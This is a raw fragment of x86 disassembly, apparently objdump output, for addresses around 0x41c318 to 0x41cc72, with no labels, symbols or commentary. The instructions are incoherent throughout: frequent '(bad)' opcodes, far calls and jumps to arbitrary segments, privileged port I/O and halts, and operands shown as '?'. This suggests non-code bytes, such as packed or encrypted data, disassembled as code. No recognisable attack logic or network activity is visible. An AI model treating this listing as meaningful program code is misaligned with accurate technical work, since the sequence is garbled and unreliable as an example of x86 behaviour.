  41c318:	and    BYTE PTR [ebx+edx*4],ah
  41c31b:	call   0x61ea:0xbd521503
  41c322:	rcr    BYTE PTR [edi+0x3c],cl
  41c325:	aas    
  41c326:	hlt    
  41c327:	dec    edx
  41c328:	dec    ebx
  41c329:	inc    ecx
  41c32a:	dec    ecx
  41c32b:	aad    0xd3
  41c32d:	and    al,0x3b
  41c32f:	sub    esi,DWORD PTR [edi]
  41c331:	inc    ebx
  41c332:	fwait
  41c333:	out    0xa9,eax
  41c335:	xchg   esp,eax
  41c336:	or     bl,0x19
  41c339:	sahf   
  41c33a:	sbb    eax,0x82cad249
  41c33f:	in     eax,0x8c
  41c341:	mov    ah,0x4a
  41c343:	dec    esi
  41c344:	cmp    DWORD PTR [ecx],0xfffffff9
  41c347:	push   0x4eb1a94c
  41c34c:	jbe    0x41c2cf
  41c34e:	xchg   ebx,eax
  41c34f:	push   ss
  41c350:	loop   0x41c320
  41c352:	repz jmp 0x81483990
  41c358:	in     al,dx
  41c359:	mov    dl,0xec
  41c35b:	test   DWORD PTR [edi],esp
  41c35d:	sbb    eax,0xf4e7f799
  41c362:	adc    al,0x14
  41c364:	dec    edx
  41c365:	shr    BYTE PTR [ebx-0x8],1
  41c368:	mov    dh,0x56
  41c36a:	dec    eax
  41c36b:	push   cs
  41c36c:	push   0xffffffaa
  41c36e:	aaa    
  41c36f:	ds test cl,bl
  41c372:	add    cl,ah
  41c374:	idiv   DWORD PTR [eax+0x1e]
  41c377:	fnstsw WORD PTR [edx+ebp*1+0x9]
  41c37b:	call   0x1e9c:0xee098282
  41c382:	pop    es
  41c383:	mov    dh,0xc7
  41c385:	xor    edx,DWORD PTR [eax]
  41c387:	push   esp
  41c388:	mov    dl,0x88
  41c38a:	inc    esi
  41c38b:	sub    eax,0x2351bfb5
  41c390:	jae    0x41c39a
  41c392:	clc    
  41c393:	ror    bl,1
  41c395:	pop    ebx
  41c396:	out    0x8e,eax
  41c398:	push   ds
  41c399:	mov    eax,0xa5310270
  41c39e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c39f:	fisub  WORD PTR [ebp+0x47]
  41c3a3:	(bad)  
  41c3a4:	iret   
  41c3a5:	inc    ecx
  41c3a6:	bound  eax,QWORD PTR ds:0xe8621922
  41c3ac:	mov    ebp,0x59901809
  41c3b1:	mov    cl,0x15
  41c3b3:	imul   esi,DWORD PTR [ebx],0x77
  41c3b6:	sbb    eax,0xc7199a2b
  41c3bb:	scas   al,BYTE PTR es:[edi]
  41c3bc:	push   ebp
  41c3bd:	ret    
  41c3be:	fild   QWORD PTR [edx+0x11ec890b]
  41c3c4:	loopne 0x41c39b
  41c3c6:	mov    ?,WORD PTR [edi-0x56]
  41c3c9:	repnz sti 
  41c3cb:	jl     0x41c365
  41c3cd:	cmp    ebp,esp
  41c3cf:	ja     0x41c3b0
  41c3d1:	retf   
  41c3d2:	mov    bh,0x96
  41c3d4:	ss cmp al,0x22
  41c3d7:	aas    
  41c3d8:	in     eax,dx
  41c3d9:	sub    esi,esp
  41c3db:	and    dl,BYTE PTR [ecx+0x6c8f0f97]
  41c3e1:	es loopne 0x41c382
  41c3e4:	sbb    DWORD PTR [ebp-0x67348eaa],0x4c
  41c3eb:	cmp    bh,dh
  41c3ed:	adc    BYTE PTR [edi-0x7a],0xb2
  41c3f1:	stos   DWORD PTR es:[edi],eax
  41c3f2:	push   es
  41c3f3:	and    BYTE PTR [edi-0x13],ch
  41c3f6:	jg     0x41c39d
  41c3f8:	or     eax,0xa2959b8b
  41c3fd:	out    dx,eax
  41c3fe:	add    eax,0x5a09191b
  41c403:	mov    edx,ebx
  41c405:	out    dx,al
  41c406:	cmp    edi,DWORD PTR [ebp-0x54]
  41c409:	pop    ds
  41c40a:	stos   BYTE PTR es:[edi],al
  41c40b:	cmp    bl,0xb7
  41c40e:	pop    esp
  41c40f:	add    bl,BYTE PTR [edi-0x47a1c0ef]
  41c415:	inc    esi
  41c416:	dec    ebp
  41c417:	sub    BYTE PTR [ebx+ebx*4+0x404f34b9],0xe2
  41c41f:	push   esi
  41c420:	xlat   BYTE PTR ds:[ebx]
  41c421:	jg     0x41c480
  41c423:	pop    edx
  41c424:	add    al,0xca
  41c426:	ret    
  41c427:	shr    dh,0xda
  41c42a:	push   edx
  41c42b:	xor    cl,BYTE PTR [esi-0x8]
  41c42e:	(bad)  
  41c42f:	hlt    
  41c430:	push   es
  41c431:	pop    esi
  41c432:	dec    edx
  41c433:	call   0xac88:0x6625b74
  41c43a:	and    edx,DWORD PTR [edx-0x49ce9306]
  41c440:	lds    ebp,FWORD PTR [eax-0x54b8e336]
  41c446:	(bad)  
  41c447:	xor    ebx,edi
  41c449:	gs scas al,BYTE PTR es:[edi]
  41c44b:	data16 add al,0xfe
  41c44e:	inc    eax
  41c44f:	push   0x74df5ca0
  41c454:	mov    eax,ds:0x59b7675d
  41c459:	lods   ax,WORD PTR ds:[esi]
  41c45b:	xor    eax,0x5c9ee670
  41c460:	jecxz  0x41c44c
  41c462:	xor    ecx,DWORD PTR [eax+0xb0924a5]
  41c468:	popa   
  41c469:	xchg   BYTE PTR [esi+0x2e772a21],bl
  41c46f:	cmc    
  41c470:	es push 0x5a
  41c473:	test   al,0x4e
  41c475:	imul   edi,DWORD PTR [ebp-0x3d456c69],0xffffff90
  41c47c:	jg     0x41c4b7
  41c47e:	jo     0x41c49d
  41c480:	fdiv   DWORD PTR [esi]
  41c482:	adc    bh,BYTE PTR [esi-0x41]
  41c485:	lods   al,BYTE PTR ds:[esi]
  41c486:	es dec eax
  41c488:	or     eax,edx
  41c48a:	(bad)  
  41c48b:	push   edi
  41c48c:	jbe    0x41c4ca
  41c48e:	jae    0x41c49c
  41c490:	and    BYTE PTR [edi],ah
  41c492:	jns    0x41c4ed
  41c494:	int    0xf8
  41c496:	adc    esp,DWORD PTR [ecx]
  41c498:	pop    ss
  41c499:	inc    ebp
  41c49a:	call   0x9116834
  41c49f:	push   ebp
  41c4a0:	inc    ecx
  41c4a1:	push   esi
  41c4a2:	add    DWORD PTR [esi],edx
  41c4a4:	ins    BYTE PTR es:[edi],dx
  41c4a5:	aaa    
  41c4a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4a7:	mov    dh,ah
  41c4a9:	jne    0x41c44b
  41c4ab:	scas   eax,DWORD PTR es:[edi]
  41c4ac:	sub    BYTE PTR [ecx+0x2f],al
  41c4af:	lods   eax,DWORD PTR ds:[esi]
  41c4b0:	hlt    
  41c4b1:	outs   dx,DWORD PTR ds:[esi]
  41c4b2:	xchg   ecx,ecx
  41c4b4:	and    eax,0x6a6698f5
  41c4b9:	and    DWORD PTR [ebx-0x35adcfb3],edx
  41c4bf:	and    edi,ecx
  41c4c1:	cdq    
  41c4c2:	je     0x41c519
  41c4c4:	aam    0x62
  41c4c6:	dec    esp
  41c4c7:	dec    ebx
  41c4c8:	xchg   edi,eax
  41c4c9:	ja     0x41c47e
  41c4cb:	or     al,0x41
  41c4cd:	loopne 0x41c521
  41c4cf:	scas   al,BYTE PTR es:[edi]
  41c4d0:	pushf  
  41c4d1:	pop    ss
  41c4d2:	retf   0xb44a
  41c4d5:	add    BYTE PTR [edx-0x2661dfa1],0x66
  41c4dc:	popf   
  41c4dd:	tzcnt  ebp,DWORD PTR [esi+0x2d]
  41c4e2:	(bad)  
  41c4e3:	jge    0x41c533
  41c4e5:	rcl    esi,cl
  41c4e7:	push   0x3e
  41c4e9:	or     al,BYTE PTR [eax+eax*1]
  41c4ec:	fdivr  QWORD PTR ds:0x16b60788
  41c4f2:	(bad)  
  41c4f3:	shl    dl,0x60
  41c4f6:	push   eax
  41c4f7:	out    dx,eax
  41c4f8:	mov    ch,0x17
  41c4fa:	pop    ecx
  41c4fb:	and    DWORD PTR [ecx],edx
  41c4fd:	lahf   
  41c4fe:	pushf  
  41c4ff:	pop    ebx
  41c500:	add    dl,BYTE PTR [ebx-0x56]
  41c503:	push   edx
  41c504:	jmp    0x41c49d
  41c506:	cs pusha 
  41c508:	fdiv   DWORD PTR [esi]
  41c50a:	pop    edi
  41c50b:	cmp    eax,0xbc77fcdc
  41c510:	xchg   esp,eax
  41c511:	sbb    al,0x45
  41c513:	iret   
  41c514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c515:	leave  
  41c516:	adc    ebp,DWORD PTR ds:0xe5d70a56
  41c51c:	add    al,0x7e
  41c51e:	pop    es
  41c51f:	sahf   
  41c520:	or     eax,0xf56587a
  41c525:	xchg   DWORD PTR [ecx+0x35],ebp
  41c528:	pusha  
  41c529:	mov    WORD PTR [ebp+ebx*4+0x37e93e5a],?
  41c530:	mov    ch,0x16
  41c532:	pop    edi
  41c533:	dec    esi
  41c534:	xchg   ebp,edi
  41c536:	mov    edx,0x1b23ee15
  41c53b:	test   DWORD PTR [edx+0x43],ecx
  41c53e:	inc    ebx
  41c53f:	push   esi
  41c540:	xor    dh,BYTE PTR [eax]
  41c542:	jmp    0xec3a5664
  41c547:	pop    esp
  41c548:	enter  0x5ef2,0xc5
  41c54c:	imul   eax,DWORD PTR [eax-0x62],0xf483d0b
  41c553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c554:	and    al,0x88
  41c556:	mov    BYTE PTR [esi],ah
  41c558:	or     eax,0xd88ea7c1
  41c55d:	fidivr DWORD PTR gs:[eax]
  41c560:	pop    ebx
  41c561:	mov    bh,0x2f
  41c563:	lea    esp,[ecx]
  41c565:	mov    ds:0x92161c86,eax
  41c56a:	aas    
  41c56b:	fucom  st(2)
  41c56d:	mov    al,BYTE PTR [ebp+0x403788c5]
  41c573:	popa   
  41c574:	adc    ah,BYTE PTR [edi]
  41c576:	cmp    BYTE PTR [ebp-0x68],bh
  41c579:	jns    0x41c5ed
  41c57b:	dec    esp
  41c57c:	icebp  
  41c57d:	xor    al,0x7
  41c57f:	add    BYTE PTR [edi-0x121d46e2],0xc5
  41c586:	js     0x41c566
  41c588:	and    dl,BYTE PTR [ebp-0x47]
  41c58b:	push   0xde3462e5
  41c590:	jl     0x41c582
  41c592:	adc    BYTE PTR [edx-0x58f04acb],al
  41c598:	xchg   ebx,eax
  41c599:	mov    edi,DWORD PTR [ecx]
  41c59b:	mov    ecx,0x9d0e76a2
  41c5a0:	and    eax,0xd5100993
  41c5a5:	inc    ecx
  41c5a6:	in     al,0x24
  41c5a8:	and    DWORD PTR ds:[ebp-0x5601287d],ebp
  41c5af:	(bad)  
  41c5b0:	int    0xe
  41c5b2:	or     DWORD PTR [edx],ebx
  41c5b4:	adc    ecx,DWORD PTR [esi-0x1425717d]
  41c5ba:	jo     0x41c592
  41c5bc:	lds    edi,FWORD PTR [edx]
  41c5be:	add    cl,BYTE PTR [esi+edi*1-0x7c]
  41c5c2:	aaa    
  41c5c3:	lods   eax,DWORD PTR ds:[esi]
  41c5c4:	lea    edx,[esp+eiz*2+0x31]
  41c5c8:	and    al,0xa5
  41c5ca:	jmp    0x41c57a
  41c5cc:	ja     0x41c618
  41c5ce:	aaa    
  41c5cf:	sbb    bl,0xf0
  41c5d2:	sahf   
  41c5d3:	scas   al,BYTE PTR es:[edi]
  41c5d4:	or     eax,0x7e1266e0
  41c5d9:	fnstenv [ecx]
  41c5db:	jbe    0x41c65c
  41c5dd:	shl    BYTE PTR [eax-0x21],1
  41c5e0:	div    DWORD PTR [ecx+0x1fd16221]
  41c5e6:	add    dl,BYTE PTR [ebx+0x34]
  41c5e9:	(bad)  
  41c5ea:	jnp    0x41c59f
  41c5ec:	inc    edi
  41c5ed:	and    dl,BYTE PTR [edx+ebp*4-0x68]
  41c5f1:	pop    ebx
  41c5f2:	out    dx,eax
  41c5f3:	ss pushf 
  41c5f5:	test   BYTE PTR [edx-0x25254ead],0xad
  41c5fc:	lds    eax,FWORD PTR [ecx]
  41c5fe:	lahf   
  41c5ff:	sbb    DWORD PTR [ebp+0x838d466],esi
  41c605:	popf   
  41c606:	enter  0x6209,0x47
  41c60a:	fst    DWORD PTR [ecx]
  41c60c:	and    esi,DWORD PTR [ebx]
  41c60e:	mov    esp,?
  41c610:	jmp    DWORD PTR [ebx+edi*2]
  41c613:	inc    ebp
  41c614:	adc    al,0xc9
  41c616:	jl     0x41c695
  41c618:	push   esi
  41c619:	mul    DWORD PTR [eax]
  41c61b:	sbb    ebx,DWORD PTR [ebp+0x44701f17]
  41c621:	rcl    BYTE PTR [eax-0x58],1
  41c624:	fsubrp st(6),st
  41c626:	jbe    0x41c67b
  41c628:	or     eax,0x36dd13c5
  41c62d:	jl     0x41c5ee
  41c62f:	pushf  
  41c630:	mov    ebp,0x9ca9b5a9
  41c635:	pop    ebp
  41c636:	add    eax,0xe6986df9
  41c63b:	repnz sub eax,0xb6b8bab8
  41c641:	cli    
  41c642:	outs   dx,BYTE PTR ds:[esi]
  41c643:	mov    eax,0x3875b5af
  41c648:	jmp    0x41c65f
  41c64a:	(bad)  
  41c64b:	call   0xda2a593
  41c650:	outs   dx,BYTE PTR ds:[esi]
	...
  41c829:	pushf  
  41c82a:	sbb    al,bl
  41c82c:	push   esi
  41c82d:	(bad)  
  41c82f:	sahf   
  41c830:	fidivr DWORD PTR [esi-0x64]
  41c833:	add    al,ah
  41c835:	gs jno 0x41c82e
  41c838:	dec    ebx
  41c839:	sti    
  41c83a:	scas   eax,DWORD PTR es:[edi]
  41c83b:	add    DWORD PTR [eax],eax
  41c83d:	and    BYTE PTR [edi],al
  41c83f:	add    BYTE PTR [eax],al
  41c841:	into   
  41c842:	stc    
  41c843:	xor    bh,BYTE PTR [esi+0x46]
  41c846:	cmp    dh,BYTE PTR [ecx+0x59]
  41c849:	mov    esp,DWORD PTR [edi+ecx*1+0x5fee4373]
  41c850:	pop    ebx
  41c851:	cld    
  41c852:	push   ds
  41c853:	sub    DWORD PTR [ecx+0x3c],ebx
  41c856:	sar    DWORD PTR [esi+ecx*2],1
  41c859:	vsqrtss xmm3,xmm0,DWORD PTR [esi+0x6d77cbb2]
  41c861:	sbb    DWORD PTR [ebx],ebx
  41c863:	mov    edi,0x60350b38
  41c868:	inc    ecx
  41c869:	and    DWORD PTR [ecx+0x78d80bb3],ecx
  41c86f:	in     eax,0x39
  41c871:	int    0xeb
  41c873:	jae    0x41c850
  41c875:	psubusb mm5,QWORD PTR [edi+0x528ab0e2]
  41c87c:	loopne 0x41c846
  41c87e:	stc    
  41c87f:	iret   
  41c880:	aam    0x85
  41c882:	inc    ebx
  41c883:	daa    
  41c884:	in     eax,dx
  41c885:	and    eax,0x52e5ee07
  41c88a:	add    eax,0xde79632a
  41c88f:	in     al,dx
  41c890:	mov    ah,0x90
  41c892:	sub    eax,0x91d011cf
  41c897:	add    ebp,edx
  41c899:	sub    cl,BYTE PTR [ebp+0x6bc0e972]
  41c89f:	ins    BYTE PTR es:[edi],dx
  41c8a0:	jge    0x41c8bc
  41c8a2:	sti    
  41c8a3:	inc    ebp
  41c8a4:	inc    esi
  41c8a5:	sbb    ebx,DWORD PTR [edi-0x1a]
  41c8a8:	add    DWORD PTR [edx-0x51],esp
  41c8ab:	repnz sub BYTE PTR [edx+0x44fddaf1],ch
  41c8b2:	ins    DWORD PTR es:[edi],dx
  41c8b3:	fisttp DWORD PTR [ebp-0x7a9f9935]
  41c8b9:	or     ebx,DWORD PTR [esi+esi*2]
  41c8bc:	fdiv   st(3),st
  41c8be:	sar    BYTE PTR [esi-0x19],0x1d
  41c8c2:	mov    eax,ds:0x44c068bb
  41c8c7:	call   DWORD PTR [ebx-0x5b336d9f]
  41c8cd:	in     al,0xe4
  41c8cf:	pop    ebx
  41c8d0:	add    dh,BYTE PTR [esi]
  41c8d2:	dec    ebp
  41c8d3:	push   ebp
  41c8d4:	mov    eax,0xe997477f
  41c8d9:	ficom  DWORD PTR [ecx+edx*2]
  41c8dc:	lock xchg ecx,eax
  41c8de:	push   esi
  41c8df:	mov    al,ah
  41c8e1:	pop    es
  41c8e2:	jns    0x41c871
  41c8e4:	ds jne 0x41c8bd
  41c8e7:	out    0xff,eax
  41c8e9:	push   ds
  41c8ea:	in     eax,0x8e
  41c8ec:	and    eax,esi
  41c8ee:	ret    0xe39f
  41c8f1:	stos   DWORD PTR es:[edi],eax
  41c8f2:	add    DWORD PTR [edx-0x2ec0125f],esi
  41c8f8:	or     eax,0xa9cb5b22
  41c8fd:	aaa    
  41c8fe:	or     esi,DWORD PTR [edi+0x53b3352b]
  41c904:	add    eax,0xd1c58ffb
  41c909:	aam    0x3
  41c90b:	xor    DWORD PTR [edi+0x32394ec6],0x38191d38
  41c915:	(bad)  
  41c916:	xlat   BYTE PTR ds:[ebx]
  41c917:	clc    
  41c918:	xchg   ebp,eax
  41c919:	dec    ebx
  41c91a:	(bad)  
  41c91b:	fld    TBYTE PTR [ecx]
  41c91d:	jg     0x41c92e
  41c91f:	jns    0x41c900
  41c921:	or     DWORD PTR [edx-0x27559bf5],esi
  41c927:	and    eax,0xe2c23be9
  41c92c:	sub    cl,al
  41c92e:	cmp    eax,0x68918a09
  41c933:	pop    eax
  41c934:	mov    edi,0xf30a881c
  41c939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c93a:	push   ebp
  41c93b:	std    
  41c93c:	test   al,0x43
  41c93e:	dec    esp
  41c93f:	xchg   DWORD PTR [ecx-0x195555e9],edi
  41c945:	mov    dl,0x4d
  41c947:	inc    edi
  41c948:	inc    esi
  41c949:	lahf   
  41c94a:	ret    0x32fe
  41c94d:	daa    
  41c94e:	and    eax,0xb5a28856
  41c953:	adc    eax,0xd1ccc8a7
  41c958:	call   0xee4d55a6
  41c95d:	add    al,0x71
  41c95f:	cs fs (bad) 
  41c962:	bound  esp,QWORD PTR [ebp-0x3514f39e]
  41c968:	inc    edi
  41c969:	imul   ebp,edx,0xffffffa3
  41c96c:	fsub   QWORD PTR [edi]
  41c96e:	jg     0x41c93b
  41c970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c971:	int3   
  41c972:	xchg   esp,eax
  41c973:	cmp    ecx,esp
  41c975:	pop    eax
  41c976:	lds    ecx,FWORD PTR [ebp-0x43d62837]
  41c97c:	in     al,0xc3
  41c97e:	cmp    BYTE PTR [edx-0x4e6e70f6],al
  41c984:	data16 add dl,BYTE PTR [edx-0x35188c51]
  41c98b:	cmp    al,BYTE PTR [edx+eiz*8-0x6e]
  41c98f:	js     0x41c973
  41c991:	mov    bl,BYTE PTR [ebx+0x3b74b04c]
  41c997:	js     0x41c999
  41c999:	out    0xfa,eax
  41c99b:	loop   0x41c972
  41c99d:	daa    
  41c99e:	not    al
  41c9a0:	jo     0x41c963
  41c9a2:	and    eax,0x48943e7b
  41c9a7:	push   eax
  41c9a8:	popa   
  41c9a9:	cmp    DWORD PTR [esi+eiz*8-0x13],edx
  41c9ad:	jae    0x41c933
  41c9af:	ja     0x41c95a
  41c9b1:	arpl   WORD PTR [edx+0x62f294e3],si
  41c9b7:	loop   0x41c986
  41c9b9:	add    DWORD PTR [edx],ecx
  41c9bb:	or     DWORD PTR [edi-0x7c39d136],0x2d
  41c9c2:	xor    edx,DWORD PTR [eax+ebp*2]
  41c9c5:	sub    BYTE PTR [ebx+0x3b],dh
  41c9c8:	push   ss
  41c9c9:	sbb    al,0x95
  41c9cb:	jnp    0x41c99b
  41c9cd:	ds sbb eax,0xf0400fd0
  41c9d3:	push   ebx
  41c9d4:	shr    BYTE PTR [edx],1
  41c9d6:	or     DWORD PTR ds:0x2041edc0,ebx
  41c9dc:	mov    bh,0x30
  41c9de:	and    al,0x9f
  41c9e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9e1:	mov    esp,0x6cf72e7c
  41c9e6:	xchg   eax,esp
  41c9e8:	adc    eax,0x3b8f33a
  41c9ed:	sahf   
  41c9ee:	mov    eax,0x9cd88f2b
  41c9f3:	iret   
  41c9f4:	inc    eax
  41c9f5:	xor    DWORD PTR [ebx],edx
  41c9f7:	lea    ebp,[ecx-0x30094a2c]
  41c9fd:	call   0xd930:0x83d984d4
  41ca04:	mov    cl,0x4c
  41ca06:	loop   0x41c9d4
  41ca08:	arpl   bp,cx
  41ca0a:	adc    DWORD PTR [ebx],ebp
  41ca0c:	add    ebp,DWORD PTR [esi+0x34994ecb]
  41ca12:	jmp    0x8326dc31
  41ca17:	and    bl,BYTE PTR [eax-0x6c67305b]
  41ca1d:	aas    
  41ca1e:	sub    eax,0xf1e93e4
  41ca23:	mov    eax,DWORD PTR [edx+esi*4+0x1d]
  41ca27:	or     esp,ecx
  41ca29:	pushf  
  41ca2a:	xchg   ebp,eax
  41ca2b:	and    ecx,edi
  41ca2d:	jns    0x41ca2a
  41ca2f:	xchg   ebx,eax
  41ca30:	push   es
  41ca31:	pop    edi
  41ca32:	inc    ebx
  41ca33:	cmp    al,0xda
  41ca35:	push   edx
  41ca36:	fisub  DWORD PTR [esi+0x36]
  41ca39:	sti    
  41ca3a:	push   es
  41ca3b:	outs   dx,BYTE PTR ds:[esi]
  41ca3c:	adc    dh,BYTE PTR [esi+esi*4-0x7a465019]
  41ca43:	sbb    al,0x1d
  41ca45:	call   0x159aa859
  41ca4a:	fwait
  41ca4b:	sub    al,BYTE PTR [ecx]
  41ca4d:	inc    ecx
  41ca4e:	jmp    0x2dcc:0x470b8970
  41ca55:	and    ecx,ebp
  41ca57:	div    BYTE PTR [esi]
  41ca59:	push   es
  41ca5a:	scas   al,BYTE PTR es:[edi]
  41ca5b:	scas   al,BYTE PTR es:[edi]
  41ca5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca5d:	loope  0x41ca15
  41ca5f:	test   BYTE PTR [ecx+0x4d226ef1],0x73
  41ca66:	lds    ecx,FWORD PTR [ecx+0x7b874ecf]
  41ca6c:	(bad)  
  41ca6d:	test   DWORD PTR [edx-0x80],ebp
  41ca70:	xor    ah,bh
  41ca72:	fwait
  41ca73:	mov    bl,0xbe
  41ca75:	jmp    0x41caba
  41ca77:	dec    edi
  41ca78:	pop    ss
  41ca79:	xor    DWORD PTR [eax],0x71873024
  41ca7f:	jge    0x41cad6
  41ca81:	punpckhdq mm6,QWORD PTR [eax]
  41ca84:	out    dx,eax
  41ca85:	sbb    al,0xa5
  41ca87:	(bad)  
  41ca89:	push   es
  41ca8a:	mov    esp,0xda4f0902
  41ca8f:	dec    esp
  41ca90:	jmp    0x800f:0x55dd1df0
  41ca97:	mov    ebx,0xac14c72f
  41ca9c:	aas    
  41ca9d:	outs   dx,BYTE PTR ds:[esi]
  41ca9e:	aam    0x4c
  41caa0:	inc    eax
  41caa1:	xor    DWORD PTR [edi+ecx*8],0x7c
  41caa5:	xor    ecx,DWORD PTR [ecx-0x140c2dbd]
  41caab:	mov    ecx,0xfe1f1158
  41cab0:	loope  0x41ca43
  41cab2:	inc    eax
  41cab3:	dec    ecx
  41cab4:	dec    eax
  41cab5:	or     BYTE PTR [esi],0xe6
  41cab8:	xor    eax,0xd1a3d6ab
  41cabd:	add    eax,esp
  41cabf:	cmp    al,0x48
  41cac1:	sub    eax,0xc36989d7
  41cac6:	mov    esi,0xf46c3e7d
  41cacb:	xor    dl,dh
  41cacd:	je     0x41cb30
  41cacf:	out    dx,al
  41cad0:	mov    dh,BYTE PTR [eax]
  41cad2:	mov    ebp,0x7c74b1a1
  41cad7:	jle    0x41cac3
  41cad9:	ins    DWORD PTR es:[edi],dx
  41cada:	shl    BYTE PTR [edx+0x47abf6dd],cl
  41cae0:	cmp    ebx,DWORD PTR [eax]
  41cae2:	popf   
  41cae3:	pop    cx
  41cae5:	inc    eax
  41cae6:	cmp    cl,dl
  41cae8:	fs std 
  41caea:	mov    BYTE PTR [eax],dl
  41caec:	sub    BYTE PTR [eax+0x76cc9908],dl
  41caf2:	mov    ebp,0x58bc7016
  41caf7:	push   0x73d43b1a
  41cafc:	inc    esi
  41cafd:	int    0xaa
  41caff:	jecxz  0x41cb20
  41cb01:	mov    esp,0xb4566957
  41cb06:	inc    ebx
  41cb07:	xlat   BYTE PTR ds:[ebx]
  41cb08:	in     eax,0x99
  41cb0a:	adc    edx,DWORD PTR [ebx+0x509f93e3]
  41cb10:	mov    ebx,0x14e6f8b7
  41cb15:	test   eax,0x4c6c2413
  41cb1a:	pop    ecx
  41cb1b:	repnz mov ecx,0x7ce16270
  41cb21:	out    dx,eax
  41cb22:	pushf  
  41cb23:	sub    esi,eax
  41cb25:	aad    0x68
  41cb27:	inc    edx
  41cb28:	fs or  al,0xd
  41cb2b:	sub    bl,0x7f
  41cb2e:	xor    eax,0xa748702c
  41cb33:	jg     0x41cba9
  41cb35:	jne    0x41cafe
  41cb37:	and    ebx,ebp
  41cb39:	mov    cl,0xc4
  41cb3b:	mov    ah,0xaf
  41cb3d:	sub    al,cl
  41cb3f:	xchg   esi,eax
  41cb40:	rol    BYTE PTR [edx],1
  41cb42:	mov    ecx,0x81e2c167
  41cb47:	sub    al,0x48
  41cb49:	jp     0x41cb4d
  41cb4b:	and    ch,BYTE PTR [ebx]
  41cb4d:	jmp    0x23c4:0x37def997
  41cb54:	ss pop edx
  41cb56:	xchg   esi,eax
  41cb57:	out    0x63,al
  41cb59:	nop
  41cb5a:	push   ebp
  41cb5b:	sbb    ecx,esp
  41cb5d:	inc    eax
  41cb5e:	(bad)  
  41cb5f:	fdivp  st(3),st
  41cb61:	stos   BYTE PTR es:[edi],al
  41cb62:	cmc    
  41cb63:	xor    DWORD PTR [eax+ecx*2+0x76365924],ebp
  41cb6a:	stos   DWORD PTR es:[edi],eax
  41cb6b:	aas    
  41cb6c:	loopne 0x41cbbb
  41cb6e:	adc    al,0xcd
  41cb70:	cmp    eax,0x5a6db52e
  41cb75:	shl    DWORD PTR [edi+ebp*4+0x4bb9f6cc],1
  41cb7c:	test   edx,edx
  41cb7e:	js     0x41cba5
  41cb80:	mov    ebx,0xeccf56a4
  41cb85:	arpl   WORD PTR [ebx+0x4b],di
  41cb88:	out    0x18,al
  41cb8a:	add    al,0x4f
  41cb8c:	jnp    0x41cb6b
  41cb8e:	dec    eax
  41cb90:	(bad)  
  41cb91:	adc    eax,0x60fe507a
  41cb96:	test   eax,0xd5c0dd78
  41cb9b:	adc    eax,esp
  41cb9d:	nop
  41cb9e:	test   DWORD PTR [edx+0x15],esi
  41cba1:	add    eax,0x14226d8b
  41cba6:	ror    DWORD PTR [ebp-0x17],cl
  41cba9:	ret    0x2b76
  41cbac:	or     bl,BYTE PTR [esi-0x36]
  41cbaf:	pop    edx
  41cbb0:	xor    BYTE PTR [ecx+0x40d6e9ee],ah
  41cbb6:	jp     0x41cbc9
  41cbb8:	xor    ebp,DWORD PTR [esi+ebp*8]
  41cbbb:	loope  0x41cb9c
  41cbbd:	or     BYTE PTR [edx-0xee6da5d],bh
  41cbc3:	pop    ds
  41cbc4:	ror    BYTE PTR ss:[ecx],0xc2
  41cbc8:	clc    
  41cbc9:	cld    
  41cbca:	push   edx
  41cbcb:	jae    0x41cb79
  41cbcd:	xor    eax,0x50d2fe26
  41cbd2:	inc    ebp
  41cbd3:	fwait
  41cbd4:	cmp    ebx,DWORD PTR [esi-0x25]
  41cbd7:	pop    es
  41cbd8:	aaa    
  41cbd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbda:	mov    esi,ss
  41cbdc:	sti    
  41cbdd:	fistp  QWORD PTR [esi+0x29]
  41cbe0:	int3   
  41cbe1:	adc    DWORD PTR [ebx+edx*8+0x1a],edx
  41cbe5:	test   BYTE PTR [ecx+0x1d],bh
  41cbe8:	xor    cl,al
  41cbea:	push   esi
  41cbeb:	jmp    0xd4a0:0x69424e87
  41cbf2:	test   al,0x50
  41cbf4:	adc    DWORD PTR [esi+0x26],edx
  41cbf7:	popa   
  41cbf8:	jno    0x41cc04
  41cbfa:	xor    al,0x31
  41cbfc:	push   ecx
  41cbfd:	fdivr  QWORD PTR [edx]
  41cbff:	int    0x13
  41cc01:	scas   eax,DWORD PTR es:[edi]
  41cc02:	inc    edi
  41cc03:	rcr    dl,cl
  41cc05:	xchg   esp,eax
  41cc06:	lods   al,BYTE PTR ds:[esi]
  41cc07:	lds    ebp,FWORD PTR [edx-0x8111443]
  41cc0d:	dec    ch
  41cc0f:	in     al,0x1
  41cc11:	call   0x16c3:0xb8e3d6c2
  41cc18:	shl    BYTE PTR [edi-0x41c6b7d5],0x90
  41cc1f:	test   BYTE PTR [ebx+eax*1+0xb],ah
  41cc23:	mov    dl,0xff
  41cc25:	jae    0x41cbb3
  41cc27:	inc    edx
  41cc28:	xchg   esi,eax
  41cc29:	xchg   edx,eax
  41cc2a:	push   ecx
  41cc2b:	sub    ebp,ebx
  41cc2d:	jmp    0x2541313e
  41cc32:	enter  0x78f0,0x31
  41cc36:	pop    eax
  41cc37:	add    eax,0x78097494
  41cc3c:	cwde   
  41cc3d:	mov    WORD PTR [ebx+0x4e4554b8],?
  41cc43:	loopne 0x41ccb0
  41cc45:	sahf   
  41cc46:	push   0xffffffab
  41cc48:	push   ebp
  41cc49:	jg     0x41cc08
  41cc4b:	pop    ss
  41cc4c:	sub    eax,0xfc0d2821
  41cc51:	int    0xae
  41cc53:	lods   al,BYTE PTR ds:[esi]
  41cc54:	and    BYTE PTR [edi],bl
  41cc56:	adc    al,0xf2
  41cc58:	inc    esi
  41cc59:	jecxz  0x41cc6d
  41cc5b:	ja     0x41cc84
  41cc5d:	mov    DWORD PTR ds:0x30944403,esp
  41cc63:	push   0x2f
  41cc65:	pop    es
  41cc66:	test   al,0xc9
  41cc68:	mov    WORD PTR [ecx+eax*8+0x37],gs
  41cc6c:	or     al,bl
  41cc6e:	jae    0x41cbf7
  41cc70:	div    BYTE PTR [esi]
  41cc72:	mov    ebx,0x1f1a1b3b
